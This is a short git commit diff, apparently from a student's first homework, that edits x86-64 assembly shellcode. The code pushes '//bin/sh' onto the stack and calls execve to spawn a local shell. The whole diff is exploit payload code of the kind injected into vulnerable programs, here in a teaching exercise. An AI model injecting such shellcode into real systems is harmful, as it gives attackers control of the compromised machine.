e314c29183c2e801954c270ecf4050d7c9b85f87
Nikolas Koxenoglou <koxakin@gmail.com>
2017-03-21 23:57:15 +0200

    Shelcode working

--- hw1/shellcode.asm
+++ hw1/shellcode.asm
@@ -8,22 +8,18 @@ global _start
 _start:
 ;clear out the registers we are going to need
 xor rax, rax
-xor rsi, rsi
 xor rdi, rdi
-xor rdx, rdx
 
-;/bin/sh =  2f, 62, 69, 6e, 2f, 73, 68
+;//bin/sh =  2f, 62, 69, 6e, 2f, 73, 68
 ;push n / s h
+push rsi
 push 0x6e69622f
-;push / b i
+;push  i b / /
 mov dword [rsp+4], 0x68732f2f
 
-
-;execve(path -> rdi, args -> rdi, envp -> dl)
+;execve(path -> rdi, args -> rsi, envp -> dl)
 mov al,59
 mov rdi, rsp
-xor rsi, rsi
-xor rdx, rdx
 syscall
 
 xor rax, rax
